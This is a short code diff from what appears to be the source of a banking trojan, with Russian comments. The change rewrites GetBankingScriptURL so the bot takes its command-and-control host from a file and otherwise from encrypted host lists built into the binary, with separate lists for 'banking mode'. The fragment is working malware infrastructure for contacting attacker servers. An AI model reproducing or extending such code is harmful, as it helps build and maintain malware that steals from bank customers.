@@ -495,17 +495,36 @@ PCHAR GetBotScriptURL(DWORD Script, PCHAR Path)
 string GetBankingScriptURL(DWORD Script, bool CheckBankingMode)
 {
 	string Host;
-	if (CheckBankingMode && IsBankingMode())
+
+
+	#ifndef DEBUGCONFIG
+		PCHAR H  = NULL;
+
+		// Первым этапом пытаемся получить хост из файла
+		if (Hosts::GetActiveHostFormFile(NULL, H))
+		{
+			CFGDBG("Cofig", "Получили хост из файла");
+			Host = H;
+			STR::Free(H);
+		}
+	#endif
+
+
+	if (Host.IsEmpty())
 	{
-		Host = GetActiveHostFromBuf2(BOT_BANKHOSTS_ARRAY,
-									 BOTPARAM_HASH_BANKHOSTS,
-									 BOTPARAM_ENCRYPTED_BANKHOSTS);
-	}
-	else
-	{
-		Host = GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY,
-									 BOTPARAM_HASH_MAINHOSTS,
-									 BOTPARAM_ENCRYPTED_MAINHOSTS);
+		// Получаем хосты из вшитых данных
+		if (CheckBankingMode && IsBankingMode())
+		{
+			Host = GetActiveHostFromBuf2(BOT_BANKHOSTS_ARRAY,
+										 BOTPARAM_HASH_BANKHOSTS,
+										 BOTPARAM_ENCRYPTED_BANKHOSTS);
+		}
+		else
+		{
+			Host = GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY,
+										 BOTPARAM_HASH_MAINHOSTS,
+										 BOTPARAM_ENCRYPTED_MAINHOSTS);
+		}
     }
 
 	string URL;
